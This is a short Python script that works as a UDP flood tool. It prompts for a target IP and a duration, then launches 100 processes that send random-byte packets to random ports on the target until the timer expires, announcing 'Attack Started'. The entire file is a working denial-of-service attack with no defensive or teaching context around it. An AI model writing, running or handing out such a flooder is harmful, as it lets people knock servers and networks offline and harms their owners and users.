import socket
import random
import threading
import time
import multiprocessing

ip = input("[IP]:")
period = int(input("[TIMER]:"))

timeout = time.time()+1*period

def attack():
    Bytes = random._urandom(1024)
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while time.time()<timeout:
        dport = random.randint(22, 55500)
        addr = (ip,dport)
        try:
            for _ in range(100):
                s.sendto(Bytes*random.randint(10, 20), addr)
        except:
            s.close()

print("Attack Started")
for x in range(100):
    th = multiprocessing.Process (target=attack)
    th.start()
